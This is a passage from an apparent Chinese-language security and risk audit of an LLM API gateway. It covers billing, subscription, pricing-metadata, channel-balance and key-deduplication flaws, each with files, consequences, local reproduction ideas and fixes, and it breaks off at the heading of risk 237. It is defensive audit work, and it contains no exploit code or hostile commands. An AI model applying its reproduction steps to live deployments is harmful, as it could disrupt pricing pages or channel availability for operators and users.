- 可能后果：一条空 prefix/contains/suffix metadata 可以变成全局兜底规则。若该 metadata `status=0`，所有没有精确 metadata 的 enabled 模型会从 `/api/pricing` 消失，用户看到价格页突然缺模型，但 `/v1/models` 和真实 relay 仍可能可用；若 `status=1` 且配置了错误 endpoints、vendor、tags 或描述，则大量模型会在价格页被展示成同一供应商、同一能力和同一 code sample，造成“文档示例可调用但实际端点/模型类型不符”的客服和售前误导。该问题不直接构成卡 bug 充值或免费调用，但会污染模型售卖面和运营审核面，放大风险 220、196、199 的排查难度。
- 复现思路：本地用 Admin API 更新一条已有模型 metadata，提交 `{id: X, model_name: "", name_rule: 1, status: 0}`，刷新 pricing 后观察 `/api/pricing` 是否大量缺少 enabled ability 模型；再提交 `{id: X, model_name: "", name_rule: 1, status: 1, endpoints: "{\"fake\":{\"path\":\"/v1/fake/{model}\",\"method\":\"POST\"}}"}`，观察价格页模型详情是否给大量模型展示 fake endpoint/code sample。只在本地测试库复现，不修改生产模型元数据。
- 修复建议：为 create/update/status_only 建立统一 `validateModelMeta`：`model_name` 必须 trim 后非空，`name_rule` 限定 0..3，非 exact 规则必须有最小长度或显式禁止空串，status 限定枚举，endpoints 必须是允许的 endpoint type 且 path/method schema 合法。规则匹配应跳过空规则，并对 broad prefix/contains 变更要求 Root/step-up、dry-run matched_count、变更原因和审计。`SyncUpstreamPreview`/`SyncUpstreamModels` 也应把 endpoints 差异纳入预览/覆盖时的 schema 校验，避免同步与手工编辑口径不一致。
- 优先级：P2
- 当前状态：已确认更新接口可强制保存空 `model_name`，空规则会在 `updatePricing` 的字符串匹配中命中所有模型；尚未修复。

### 风险 222：模型 metadata 同步忽略 endpoints 且吞掉覆盖更新错误，可能返回成功但价格页仍使用旧能力说明

- 标题：上游模型 metadata payload 定义了 `endpoints`，但缺失模型创建、冲突预览和 overwrite 更新都不落地 endpoints；overwrite 事务错误被忽略，接口仍返回 success
- 影响范围：Admin 模型同步向导、missing models 自动补全、模型 metadata、`/api/pricing` 的 `supported_endpoint_types/supported_endpoint`、模型详情 code samples、官方同步开关、客服文档和用户 API 入口说明
- 触发条件：上游 metadata 为某模型提供或更新 endpoints；本地模型缺失 metadata 或 endpoints 为空/旧值；Admin 运行 sync wizard 或选择 overwrite；数据库保存失败、字段过长、vendor 创建失败后返回 0，或同步字段包含后端不处理的 endpoints
- 涉及文件/函数：
  - `controller/model_sync.go:54-63`：`upstreamModel` 包含 `Endpoints json.RawMessage`
  - `controller/model_sync.go:355-383`：缺失模型创建只写 `ModelName/Description/Icon/Tags/VendorID/Status/NameRule`，没有把 `up.Endpoints` 写入 `model.Model.Endpoints`
  - `controller/model_sync.go:596-615`：`SyncUpstreamPreview` 只比较 description、icon、tags、vendor、name_rule、status，不比较 endpoints；前端不会提示 endpoints 差异
  - `controller/model_sync.go:411-447`：overwrite 更新只处理 description、icon、tags、vendor、name_rule、status，不处理 endpoints
  - `controller/model_sync.go:411-447`：`_ = model.DB.Transaction(...)` 忽略事务返回错误；若 `tx.Save(&local)` 失败，接口仍继续并最终返回 `success: true`，失败项不会进入 `skipped_models` 或错误列表
  - `web/default/src/features/models/components/dialogs/upstream-conflict-dialog.tsx:81-83`：前端 field label 包含 `endpoints`，但后端 preview 不会产生该 field，UI 能力和后端实际差异检测不一致
  - `model/pricing.go:219-246` 与 `model/pricing.go:263-280`：只有已落库的 metadata endpoints 才会覆盖 pricing 的 supported endpoint types 和 code sample 路径；同步漏写会让价格页继续使用默认端点推断或旧 endpoints
- 可能后果：Admin 点击“同步上游模型”后看到 created/updated 成功，以为模型说明、供应商、端点和 code sample 已跟随官方 metadata 更新；实际 endpoints 从未创建/覆盖，价格页仍可能展示旧端点、默认推断端点或空端点。对于多端点模型、图片/视频/embedding/rerank 等非聊天模型，错误 code sample 会诱导用户调用错误 API，造成“模型已售卖但示例不可用”的工单。若 overwrite 保存失败被吞掉，Admin 还会误以为冲突已解决，后续价格页和同步预览状态长期不可信。
- 复现思路：本地构造上游 models.json，其中某个 missing 模型带 `endpoints={"image-generation":{"path":"/v1/images/generations","method":"POST"}}`；执行 sync 后检查新建 `models.endpoints` 是否仍为空，`/api/pricing` 是否只能用默认能力推断。再对已有模型修改上游 endpoints，运行 preview，观察 conflicts 是否没有 endpoints 项。最后在 overwrite 保存阶段注入 DB 错误或构造超长字段，观察接口是否仍返回 success 且没有失败列表。
- 修复建议：把 endpoints 纳入 metadata 同步的一等字段：创建时写入 canonical JSON；preview 比较 normalized endpoints；overwrite 支持 `endpoints` 字段并复用后端 schema 校验。`model.DB.Transaction` 的错误必须收集到 `failed_updates` 并影响响应 success 或至少返回明确失败项。同步响应应区分 created、updated、skipped、failed 和 ignored_fields，避免 Admin 把“字段未处理”理解成“同步完成”。同步结束后刷新 pricing cache，并在响应里返回 endpoints changed count。
- 优先级：P2
- 当前状态：已确认 endpoints 字段存在于上游 DTO 但没有进入创建/预览/覆盖流程；overwrite 事务错误被忽略，尚未修复。

### 风险 225：订阅消费日志不记录订阅来源，付费/兑换/管理员赠送套餐的实际 API 成本无法拆分

- 标题：`user_subscriptions.source` 只停留在订阅记录；正式 API 扣费日志和 `quota_data` 聚合只记录 `billing_source=subscription`、subscription id 和套餐信息，不记录该订阅来自付费订单、兑换码还是管理员赠送
- 影响范围：订阅套餐消费、管理员赠送套餐、订阅兑换码、试用/活动套餐成本、消费日志 `logs.other`、`quota_data` 数据看板、客服对账、利润/成本分析和滥用追踪
- 触发条件：用户同时或先后拥有来源不同的 active 订阅，例如付费 `source=order`、兑换码 `source=redemption`、管理员赠送 `source=admin`；用户通过订阅资金源调用模型或任务；运营后续按日志、数据看板或模型成本报表分析“免费试用消耗了多少”“管理员补偿套餐消耗了多少”“付费套餐毛利多少”。
- 涉及文件/函数：
  - `model/subscription.go:241-255`：`UserSubscription` 有 `Source` 字段，但只保存在订阅主记录。
  - `model/subscription.go:1073-1175`：`PreConsumeUserSubscription` 按用户 active 订阅 `end_time asc, id asc` 选择可用订阅并返回 `UserSubscriptionId/AmountTotal/AmountUsed`，没有把 `sub.Source` 返回给消费侧。
  - `model/subscription.go:1256-1283`：`SubscriptionPlanInfo` 只包含 `PlanId/PlanTitle`；`GetSubscriptionPlanInfoByUserSubscriptionId` 查询到 `UserSubscription` 后没有把 `Source` 带出。
  - `service/funding_source.go:70-101`：`SubscriptionFunding` 只缓存 `subscriptionId/preConsumed/AmountTotal/PlanId/PlanTitle`，没有 source 字段。
  - `service/billing_session.go:317-335`：`syncRelayInfo` 只把 subscription id、预扣量、总额、plan id/title 写入 `RelayInfo`。
  - `relay/common/relay_info.go:132-148`：`RelayInfo` 的订阅字段没有 `SubscriptionSource` 或等价字段。
  - `service/log_info_generate.go:333-384`：消费日志 `other` 写入 `billing_source`、`subscription_id`、`subscription_plan_id/title`、`subscription_consumed/remain`，但没有写入订阅来源。
  - `model/log.go:280-329` 与 `model/usedata.go:58-65`：消费日志和数据看板只使用 `params.Other`、user/model/quota/token 聚合；`quota_data` 没有订阅 source 维度。
- 可能后果：一个兑换码试用套餐、管理员补偿套餐和真实付费套餐都可能表现为同样的 `billing_source=subscription`。运营无法从日志或数据看板直接拆出免费活动成本、管理员补偿成本、付费套餐真实毛利，也无法发现某批兑换码或某个管理员赠送套餐被大量用于高价模型。若后续需要回收赠送权益或分析 abuse，只能人工回查 `subscription_id -> user_subscriptions.source`，而历史 `quota_data` 聚合已经丢失该维度，无法低成本重建。对于无限额度套餐，免费/管理员来源消耗高价渠道时尤其容易造成上游成本不可见。
- 复现思路：本地创建同一用户的 `source=admin` 或 `source=redemption` 订阅，再创建一个 `source=order` 订阅；发起订阅优先的模型调用，查看消费日志 `other` 只包含 `billing_source=subscription`、`subscription_id` 和套餐标题，不包含 `source`。启用 `DataExportEnabled` 后检查 `quota_data` 只按 user/model/hour 汇总，无法按付费/赠送/兑换拆分。
- 修复建议：把订阅来源作为消费账务字段贯穿全链路：`SubscriptionPreConsumeResult` 增加 `Source`，`SubscriptionFunding`、`RelayInfo` 和 `appendBillingInfo` 写入 `subscription_source`，`RecordConsumeLog` 保留该字段；`quota_data` 或新的数据看板聚合增加 `billing_source/subscription_source/source_id` 维度。对免费/兑换/管理员来源建议配置可选模型/分组/总成本上限，或者在 source policy 中显式声明是否允许正式 API、任务类高成本模型和无限额度。历史数据无法补全 source 时，应在报表中标记为 unknown，而不是默认归到付费收入。
- 优先级：P2
- 当前状态：已确认订阅 source 未进入消费日志和 `quota_data` 聚合；尚未修复。

### 风险 227：多条有限订阅不能合并扣费，合计余额充足时仍可能回退钱包或直接失败

- 标题：订阅预扣只从单条 active subscription 中寻找“剩余额度 >= 本次 amount”的记录，不支持把多条有限套餐的剩余额度分摊到同一次请求
- 影响范围：多套餐用户、订阅兑换码叠加、管理员补偿套餐、付费套餐续购、`subscription_first`/`subscription_only` 计费偏好、钱包余额、token 预扣回滚和客服账单解释
- 触发条件：同一用户同时拥有多条有限额度 active 订阅；每条订阅单独剩余额度都小于本次请求或任务预扣额度，但多条订阅合计余额大于等于本次额度；用户计费偏好为 `subscription_first` 或 `subscription_only`；请求模型或任务需要较大的预扣额度。
- 涉及文件/函数：
  - `model/subscription.go:1110-1114`：`PreConsumeUserSubscription` 查询用户全部 active 订阅并按 `end_time asc, id asc` 排序。
  - `model/subscription.go:1120-1135`：循环候选订阅时，如果 `sub.AmountTotal > 0` 且单条 `remain < amount` 就 `continue`，不会记录该套餐的可用剩余额度，也不会和下一条订阅合并。
  - `model/subscription.go:1136-1167`：成功路径只创建一条 `SubscriptionPreConsumeRecord`，只绑定一个 `UserSubscriptionId`，并只更新一条 `user_subscriptions.amount_used`。
  - `model/subscription.go:1169`：所有单条订阅都不足时返回 `subscription quota insufficient, need=...`，即使合计余额充足也一样。
  - `service/billing_session.go:207-220`：订阅预扣失败后通过字符串匹配把 `subscription quota insufficient` 映射为 `ErrorCodeInsufficientUserQuota`。
  - `service/billing_session.go:415-429`：默认 `subscription_first` 在订阅资金源返回余额不足类错误后会尝试 `tryWallet()`，因此用户钱包可能在“订阅合计余额足够”时被扣。
  - `service/billing_session.go:401-403`：`subscription_only` 不回退钱包，会在同样场景下直接拒绝请求。
- 可能后果：用户持有多个剩余额度很小但总额足够的套餐时，系统仍可能显示“订阅额度不足”或改扣钱包。对运营来说，这会制造难解释的账单争议：用户认为自己还有多份套餐余额，系统却扣了现金钱包；兑换码补偿的小额套餐和付费套餐叠加时尤其明显。任务类请求预扣较大，更容易触发“单条不足、合计足够”的边界。该问题不直接让用户免费调用，但会让订阅资产利用率、钱包扣费和客服对账出现偏差；如果叠加风险 168 的 token 回滚失败，还可能扩大 token 账实漂移。
- 复现思路：本地为同一用户创建两条 active 有限订阅，每条剩余 50，用户钱包有余额，偏好设为 `subscription_first`；发起一次需要预扣 80 的请求。观察 `PreConsumeUserSubscription` 跳过两条订阅并返回 `subscription quota insufficient`，`NewBillingSession` 随后尝试钱包资金源。把偏好改为 `subscription_only` 时，同样请求会失败，尽管订阅合计剩余 100。
- 修复建议：把订阅预扣记录从“单 request 一条 subscription”升级为可分摊 ledger：一次 request 可包含多条 `subscription_pre_consume_items`，按明确策略消耗多条订阅，例如先到期、先赠送、先小额补偿、或用户可配置优先级。消费日志和 `RelayInfo` 应支持多个 subscription id/source/plan 的快照，至少记录主来源和分摊明细。若产品不打算支持合并扣费，应在用户端和后台明确展示“单次请求必须由单个套餐覆盖”，并在钱包回退前给出可解释原因，避免静默改扣钱包。
- 优先级：P2
- 当前状态：已确认订阅预扣不支持多套餐合并；尚未修复。

### 风险 230：无 active 套餐时前端把 `subscription_only` 描述成会自动用钱包，但后端会直接拒绝

- 标题：钱包页在保存的订阅偏好为 `subscription_only` 且当前无 active subscription 时，把展示值强制显示为 `wallet_first` 并提示钱包会自动使用；真实后端 `subscription_only` 不做钱包回退
- 影响范围：订阅专用计费偏好、钱包页偏好选择器、套餐到期后的用户请求、客服工单、用户对“只用订阅/可用钱包兜底”的理解
- 触发条件：用户曾在有 active 订阅时保存 `subscription_only`；之后订阅过期、取消或被管理员作废；用户钱包仍有余额；用户查看钱包页并看到提示“Wallet will be used automatically”，随后发起模型或任务请求。
- 涉及文件/函数：
  - `web/default/src/features/wallet/components/subscription-plans-card.tsx:206-210`：当没有 active 订阅且保存偏好是订阅类时，前端把 `displayPref` 强制改成 `wallet_first`，但没有真正保存后端偏好。
  - `web/default/src/features/wallet/components/subscription-plans-card.tsx:331-393`：选择器用 `displayPref` 作为当前值，`subscription_first/subscription_only` 选项在无 active 订阅时禁用。
  - `web/default/src/features/wallet/components/subscription-plans-card.tsx:408-418`：无 active 订阅且保存偏好为 `subscription_only` 或 `subscription_first` 时，统一提示 “Wallet will be used automatically”。
  - `controller/subscription.go:71-92` 与 `common/str.go:120-127`：后端允许保存 `subscription_only`，只做枚举归一化，不根据 active subscription 自动改成 wallet 偏好。
  - `service/billing_session.go:401-403`：真实计费在 `subscription_only` 下直接 `trySubscription()`，没有 active subscription 或订阅额度不足时返回错误。
  - `service/billing_session.go:415-429`：只有 `subscription_first` 才会在无 active 订阅或订阅额度不足时尝试钱包回退。
- 可能后果：用户以为套餐到期后仍会自动改用钱包，实际请求会被“订阅额度不足或未配置订阅”拒绝；如果用户正在使用第三方客户端或自动化调用，会出现余额充足但 API 不可用的事故。客服排查时前端截图显示钱包会自动使用，后端日志却是 `subscription_only` 拒绝，形成自相矛盾的证据。这个问题不造成少扣费，但会造成可用性误导和续费/充值路径混乱。
- 复现思路：本地创建用户并设置 `billing_preference=subscription_only`，随后让其没有 active subscription 但保留钱包余额。打开钱包页，确认选择器显示为 `Wallet First` 或提示钱包会自动使用；发起一次非免费模型请求，观察 `NewBillingSession` 走 `subscription_only -> trySubscription()` 并因没有 active subscription 返回错误，不会扣钱包。
- 修复建议：前端不要把保存的 `subscription_only` 显示为 `wallet_first`，也不要提示会自动用钱包；应明确提示“订阅专用模式下，无 active 套餐时请求会失败”，并提供一键切换到 `subscription_first` 或 `wallet_first` 的操作。后端也可以在 `subscription_only` 且无 active subscription 时返回更明确的错误码和文案。若产品真实意图是自动钱包兜底，应把保存偏好改成 `subscription_first`，不要让 `subscription_only` 语义漂移。
- 优先级：P2
- 当前状态：已确认前端提示与后端 `subscription_only` 行为不一致；尚未修复。

### 风险 231：OpenAI 兼容 billing 接口忽略订阅资产和扣费偏好，外部客户端会按错误余额限流或同步渠道余额

- 标题：`/v1/dashboard/billing/subscription` 和 `/v1/dashboard/billing/usage` 只按 token 或钱包 quota/used quota 返回 `hard_limit_usd` 和 `total_usage`，不读取 active subscription、`billing_preference`、`subscription_only` 语义或多套餐余额
- 影响范围：OpenAI 兼容客户端余额展示、下游 NewAPI/OneAPI 渠道余额同步、订阅专用用户、订阅优先用户、多套餐用户、token 统计开关、自动限流/停用策略和客服对账
- 触发条件：站点开放 OpenAI 兼容 dashboard billing 路由；用户使用订阅套餐而非钱包余额作为主要资金来源；或另一个 NewAPI 实例把该站点配置为 OpenAI/Custom 上游并定时调用 billing 接口更新渠道余额；用户计费偏好为 `subscription_only`、`subscription_first`，或同时持有多条 active subscription。
- 涉及文件/函数：
  - `controller/billing.go:11-68`：`GetSubscription` 在 token 统计模式下只读取 `token.RemainQuota/UsedQuota/ExpiredTime`，在用户统计模式下只读取 `GetUserQuota/GetUserUsedQuota`，没有查询 `GetAllActiveUserSubscriptions`、订阅剩余额度、订阅到期时间或用户扣费偏好。
  - `controller/billing.go:71-107`：`GetUsage` 只返回 token 或用户钱包维度的 `UsedQuota`，不包含订阅已消费额度，因此 `HardLimitUSD - TotalUsage/100` 不能表达订阅实际可用余额。
  - `router/dashboard.go:18-21`：上述接口同时暴露在 `/dashboard/billing/*` 和 `/v1/dashboard/billing/*`，外部兼容客户端和下游站点都能消费这些结果。
  - `controller/channel-billing.go:392-420`：渠道余额同步直接请求上游 `/v1/dashboard/billing/subscription` 和 `/v1/dashboard/billing/usage`，并把 `subscription.HardLimitUSD - usage.TotalUsage/100` 写成渠道余额。
  - `controller/subscription.go:47-68` 与 `controller/subscription.go:71-92`：订阅自助接口和偏好保存链路有 active subscription 与 `billing_preference` 信息，但 billing 兼容接口没有复用这些资产视图。
  - `service/billing_session.go:401-429`：真实计费会按 `subscription_only/subscription_first/wallet_first/wallet_only` 选择资金源；其中 `subscription_only` 无钱包回退，和 billing 接口按钱包 quota 展示的口径不同。
- 可能后果：有 active 订阅但钱包余额为 0 的用户，真实请求可以用订阅成功扣费，外部客户端却看到 `hard_limit_usd=0` 或很低余额，从而提前限流、停发请求或误提示需要充值。反过来，`subscription_only` 用户没有 active 订阅但钱包仍有余额时，billing 接口可能展示正余额，客户端以为可用，真实请求却会被后端订阅专用逻辑拒绝。下游 NewAPI 把该站点作为上游时，渠道余额同步会把这种错误口径写入 channel balance，进而误触发低余额告警、自动禁用或运营报表异常。多套餐场景下，接口既不展示单条可扣套餐，也不展示合计 finite 余额，更无法表达“合计够但单条不可合并”的真实限制。
- 复现思路：本地创建用户 A，钱包 quota 为 0，active subscription 剩余额度充足，偏好为 `subscription_only` 或 `subscription_first`；请求 `/v1/dashboard/billing/subscription` 和 `/v1/dashboard/billing/usage`，观察返回余额仍按钱包/token 口径，不体现订阅可用额度。再创建用户 B，钱包有余额但无 active subscription，偏好为 `subscription_only`；billing 接口展示钱包正余额，但真实模型请求会在 `NewBillingSession` 的 `subscription_only` 分支失败。把该站点作为另一个实例的 OpenAI/Custom 渠道后，调用渠道余额更新，观察 `channel.UpdateBalance` 写入的余额来自上述错误口径。
- 修复建议：兼容 billing 接口需要返回“真实可消费视图”或明确降级为 wallet/token-only 接口。至少应增加站点私有扩展字段，例如 `billing_preference`、`wallet_available`、`subscription_available`、`subscription_finite_remaining_total`、`subscription_hard_limit`、`subscription_access_until`、`subscription_only_blocked=true`、`single_subscription_max_remaining` 和 `balance_semantics`；对 OpenAI 标准字段则保持单位稳定并选择与真实可用性一致的保守值。渠道余额同步不应盲目用 `HardLimitUSD - TotalUsage/100` 代表上游可用余额，遇到 NewAPI 扩展字段或无法判断资金源时应标记为“未知/需人工核验”，避免自动停用和错误报表。
- 优先级：P2
- 当前状态：已确认兼容 billing 接口没有读取订阅资产和扣费偏好，且渠道余额同步会消费该接口结果；尚未修复。

### 风险 232：上游 billing 返回 200 错误体时渠道余额同步按零值结构体入库并可能自动禁用渠道

- 标题：OpenAI/Custom 渠道余额同步只检查 HTTP 状态和 JSON 反序列化是否成功，不识别上游 NewAPI billing 接口用 `200 {"error": ...}` 表示失败；错误体会被反序列化成零值 subscription/usage，得到 `balance=0`
- 影响范围：OpenAI/Custom 渠道余额同步、下游 NewAPI 串联上游 NewAPI、定时 `CHANNEL_UPDATE_FREQUENCY`、全量余额更新、余额不足自动禁用、Root 通知和渠道可用性
- 触发条件：上游 `/v1/dashboard/billing/subscription` 或 `/v1/dashboard/billing/usage` 因 token/user quota 查询失败、token 被删除、数据库异常、权限异常或其他内部错误返回 HTTP 200 且 body 为 `{"error": ...}`；下游把该上游配置为 OpenAI 或 Custom 渠道并触发单渠道/全量/定时余额更新。
- 涉及文件/函数：
  - `controller/billing.go:31-39`：`GetSubscription` 遇到错误时返回 HTTP 200，并把错误放在 `error` 字段中。
  - `controller/billing.go:83-91`：`GetUsage` 同样用 HTTP 200 返回 `{"error": ...}`。
  - `controller/channel-billing.go:392-420`：`updateChannelBalance` 对 OpenAI/Custom 渠道只要求 `GetResponseBody` 返回 200 且 `json.Unmarshal` 成功；`{"error": {...}}` 对 `OpenAISubscriptionResponse` 和 `OpenAIUsageResponse` 来说会被忽略未知字段并留下零值。
  - `controller/channel-billing.go:406-409`：零值 `HasPaymentMethod=false` 会把 usage 查询窗口改成近 100 天，但不会把 subscription 结果判定为错误。
  - `controller/channel-billing.go:419-420`：零值 `HardLimitUSD=0`、`TotalUsage=0` 会得到 `balance=0` 并写入渠道表。
  - `controller/channel-billing.go:454-481`：全量余额更新中 `err == nil && balance <= 0` 会调用 `service.DisableChannel(..., "余额不足")`。
  - `service/channel.go:19-33` 与 `model/channel.go:585-589`：自动禁用会更新渠道状态并通知 Root；余额写入本身没有错误来源或可信度字段。
- 可能后果：上游只是临时查询失败或返回兼容错误体，下游却把它解释成“余额用尽”，写入 0 余额并在全量/定时路径自动禁用渠道。若多个下游实例串联同一个上游 NewAPI，单次上游 billing 查询故障可能被放大为多个渠道同时下线。单渠道手动更新虽然不会直接调用禁用分支，但会把余额覆盖为 0，误导运营以为供应商欠费。结合风险 231，订阅专用或订阅优先用户的上游错误更难被识别为“账务接口失败”，而不是“真实余额不足”。
- 复现思路：本地准备一个上游兼容服务，让 `/v1/dashboard/billing/subscription` 返回 `200 {"error":{"message":"quota db unavailable","type":"upstream_error"}}`，`/v1/dashboard/billing/usage` 返回 `200 {"error":{"message":"usage db unavailable","type":"new_api_error"}}`；下游配置为 OpenAI/Custom 渠道并触发 `/api/channel/update_balance/:id`，观察渠道余额被写为 0。再触发 `/api/channel/update_balance` 或启用 `CHANNEL_UPDATE_FREQUENCY`，观察该渠道是否因 `balance <= 0` 被标记为自动禁用。复现只使用本地假上游，不对生产供应商做故障注入。
- 修复建议：OpenAI/Custom 余额同步应定义带 `error` 字段的响应 envelope，反序列化后先检查 `error`、`object`、必填字段和数值有限性；上游返回错误体时应返回 `err` 并保留上次可信余额，不应写 0。OpenAI/Custom 兼容接口也应考虑对内部错误返回非 2xx，或至少增加 `success=false`/`balance_semantics` 供下游识别。全量自动禁用前应区分“明确余额不足”和“余额查询失败/错误体”，只有明确欠费信号才允许进入 `DisableChannel("余额不足")`。
- 优先级：P2
- 当前状态：已确认下游余额同步不识别 200 错误体，零值结果可写入余额并触发全量自动禁用；尚未修复。

### 风险 234：渠道余额字段声称 USD 但各 provider 写入原生单位，后台展示、排序和低余额判断会混用美元、人民币、点数和展示币种

- 标题：`channels.balance` 在模型和前端类型中标注为 USD，但余额更新分支直接写入各 provider 的原生余额；默认前端再按站点展示货币把它当 USD 转换，经典前端又按展示币种直接加符号，导致同一余额列混入不同单位
- 影响范围：渠道余额展示、余额排序、低余额颜色、单渠道余额查询 toast、全量余额更新、余额不足自动禁用前的运营判断、供应商账单核对、渠道成本与剩余余额比较
- 触发条件：站点同时配置 OpenAI/Custom、DeepSeek、SiliconFlow、Moonshot、OpenRouter、AIProxy/API2GPT/AIGC2D 等多种渠道；运营查看“已用/剩余”、按余额排序、点击查询余额或根据余额颜色/数值决定下线、充值、切流。
- 涉及文件/函数：
  - `model/channel.go:37-38`：`Balance` 注释为 `in USD`，但字段没有单位、来源、汇率或 provider 货币信息。
  - `web/default/src/features/channels/types.ts:51-52`：前端类型同样把 `balance` 当作 USD。
  - `controller/channel-billing.go:207-224`：AIProxy 分支把 `TotalPoints` 直接写入 `channel.UpdateBalance`。
  - `controller/channel-billing.go:243-262`：SiliconFlow 分支把 `response.Data.TotalBalance` 字符串直接 parse 后写入，没有记录该 provider 返回的原生单位。
  - `controller/channel-billing.go:265-291`：DeepSeek 分支明确选择 `Currency == "CNY"` 的 `TotalBalance`，但仍直接写入 `channels.balance`，没有换算为 USD。
  - `controller/channel-billing.go:309-321`：OpenRouter 分支用 `TotalCredits - TotalUsage` 写入余额，语义是 OpenRouter credits。
  - `controller/channel-billing.go:325-355`：Moonshot 分支把 `available_balance` 视为 CNY，并用 `operation_setting.Price` 换算成 USD 后写入；这与 DeepSeek/SiliconFlow 的直接写入形成同表不同单位。
  - `controller/channel-billing.go:419-420`：OpenAI/Custom 分支把兼容 billing 的 `HardLimitUSD - TotalUsage/100` 写入；该字段还受风险 123/231/232 的语义影响。
  - `web/default/src/features/channels/lib/channel-utils.ts:304-310`、`web/default/src/features/channels/lib/channel-actions.ts:293-304` 和 `web/default/src/features/channels/components/dialogs/balance-query-dialog.tsx:135-140`：默认前端把渠道 `balance` 传给 `formatCurrencyFromUSD`，会按站点展示货币把它从 USD 转成 CNY/custom/tokens。
  - `web/default/src/features/channels/lib/channel-utils.ts:316-322`：余额颜色阈值直接用原始 `balance < 1/<10` 判断，不区分 provider 单位。
  - `model/channel.go:78-85` 与 `controller/channel.go:92-148`：渠道列表支持按 `balance` 排序，排序基于混合单位的原始数值。
  - `web/classic/src/components/table/channels/ChannelsColumnDefs.jsx:526-559` 与 `web/classic/src/helpers/render.jsx:1071-1095`：经典前端把 `balance` 交给 `renderQuotaWithAmount`；在 CNY/CUSTOM 下主要是给原值加符号，在 TOKENS 下又把原值换成 quota，和默认前端的 USD 转换策略不一致。
- 可能后果：DeepSeek 返回 100 CNY 会被默认前端当 100 USD 显示成约 700 CNY 或大量 tokens；Moonshot 的 100 CNY 先被后端除以 `Price` 后写入，再由前端按展示币种转换；AIProxy 的 points、OpenRouter credits、SiliconFlow 原生余额和 OpenAI USD 在同一列排序，运营看到的“余额最高/最低渠道”不再表示同一经济含义。低余额颜色阈值按原始数值判断时，10 CNY、10 USD、10 points 都被当成同等安全。全量自动禁用本身只看 `balance <= 0`，不会因单位误差直接禁用正余额渠道，但运营手动下线、充值提醒、供应商账单核对和渠道利润判断会被错误单位长期污染。
- 复现思路：本地创建多个渠道并模拟余额返回：DeepSeek `Currency=CNY, TotalBalance=100`，Moonshot `available_balance=100`，OpenRouter credits=100，OpenAI hard_limit=100。触发余额更新后查看默认前端和 classic 前端余额列、toast、排序和颜色；把站点展示类型切到 CNY/TOKENS/CUSTOM，观察同一 `channels.balance` 在不同前端被二次转换或直接加符号。
- 修复建议：`channels.balance` 应拆成结构化字段或 JSON 元数据：`balance_amount`、`balance_currency`、`balance_provider_unit`、`balance_usd_normalized`、`balance_display_label`、`balance_source`。所有 provider 分支要明确返回单位；能换算的写入 normalized USD，不能换算的只作为 provider-native 显示，不参与统一余额排序和阈值。前端余额列应同时显示“provider 原生余额”和“折算 USD/展示币种”，排序/颜色默认使用 normalized USD 或明确标记为不可比较。全量报表和渠道导出也应带单位字段，避免把原生余额当统一货币。
- 优先级：P2
- 当前状态：已确认渠道余额字段和前端展示假设为 USD，但多个 provider 写入原生单位或不同换算方式；尚未修复。

### 风险 236：新增和替换渠道缺少跨渠道/同批次 key 去重，同一上游凭证可被多个渠道或多个 key index 同时消费

- 标题：批量新增、单渠道新增、multi-to-single 初始创建和多 key replace 都没有统一检查重复 key；只有追加已有多 key 的 append 分支会和当前渠道已有 key 做简单字符串去重
- 影响范围：渠道成本统计、上游 key 余额/限流、自动禁用、渠道 used_quota、tag 聚合、多 key key-index 追踪、供应商账单核对、运营批量导入 key 和复制/替换渠道流程
- 触发条件：管理员批量导入 key 时重复粘贴同一 key；多个渠道手工配置同一上游 key；复制渠道后保留同一 key；multi-to-single 初始创建时同一 key 出现多次；更新多 key 渠道时使用 replace 覆盖为包含重复 key 的列表；JSON/Vertex key 以不同格式表达同一凭证。
- 涉及文件/函数：
  - `controller/channel.go:587-685`：`AddChannel` 根据 `mode` 拆分 key 并批量创建渠道；single、batch 和 multi_to_single 创建路径没有和数据库现有渠道做 key 指纹查重，也没有对同批次重复 key 做统一去重。
  - `controller/channel.go:622-631`：multi_to_single 普通分支只 trim 并收集 key，未去重；重复 key 会在同一多 key 渠道中占用多个 index。
  - `controller/channel.go:635-647`：batch 模式直接按换行拆分或 JSON array 解析，不对同批次重复 key 做去重。
  - `controller/channel.go:658-674`：每个非空 key 都会构造成一个 `model.Channel` 并进入 `BatchInsertChannels`。
  - `model/channel.go:426-452`：`BatchInsertChannels` 只负责事务插入和 abilities 创建，没有 key 唯一性约束或重复检测。
  - `controller/channel.go:897-972`：更新已有多 key 渠道时，`append` 分支会用 trim 后字符串对 existing/new key 去重，这是正向证据。
  - `controller/channel.go:973-975`：`replace` 分支没有去重或规范化，直接使用提交的 `channel.Key`。
  - `model/channel.go:188-196` 与 `model/channel.go:199-283`：多 key 执行时按当前 key 列表和 index 选择 enabled key；重复 key 会被当作多个独立 index 参与随机/轮询。
  - `service/log_info_generate.go:274-287` 与风险 217：普通日志最多记录易漂移的 `multi_key_index`，没有稳定 key fingerprint；重复 key 会进一步让 index 维度无法代表真实凭证。
- 可能后果：同一供应商 key 被配置成多个渠道时，`channels.used_quota`、余额、自动禁用状态、错误日志和 tag 聚合都会被拆到多个 channel id；运营看到的是多个渠道各自消耗较低，供应商账单却按同一个 key 汇总，异常成本发现会延迟。重复 key 出现在同一个多 key 渠道中时，轮询/随机会让同一 key 获得更高流量权重；禁用一个 index 后，另一个重复 index 仍继续使用同一 key，运营以为已下线故障 key，真实请求仍命中它。跨渠道重复 key 还会让余额查询、自动禁用和恢复互相打架：一个渠道被禁用，另一个仍继续消耗同一上游余额。
- 复现思路：本地用 batch 新增提交两行相同假 key，确认创建两个渠道；或用 multi_to_single 提交同一 key 两次，确认 `ChannelInfo.MultiKeySize` 为 2 且两个 index 的 key preview 相同。再对其中一个重复 index 执行禁用，观察另一个 index 仍可被 `GetNextEnabledKey` 选中。复制已有渠道也可验证同一 key 跨 channel id 的成本拆分。
- 修复建议：为 key 建立不可逆 fingerprint，并在新增、复制、append、replace、batch、多 key JSON/Vertex 解析后统一规范化和查重。默认应阻止同一有效凭证在同一站点重复启用；如确需复用，应要求 Root 二次确认、填写原因，并在 UI/日志中标记 `duplicate_key_group_id`，让成本和封禁可按凭证聚合。多 key 渠道内部应禁止重复 key index；replace 分支应复用 append 的去重逻辑。对 JSON key 需做 canonical marshal 后再计算 fingerprint，避免同一凭证因空格/字段顺序不同绕过去重。
- 优先级：P2
- 当前状态：已确认新增/replace 路径缺少重复 key 检测，append 分支只做当前渠道内的简单去重；尚未修复。

### 风险 237：批量新增可把渠道 key 前缀写入渠道名称，绕过密钥查看 step-up 并扩散到列表、搜索、日志和通知

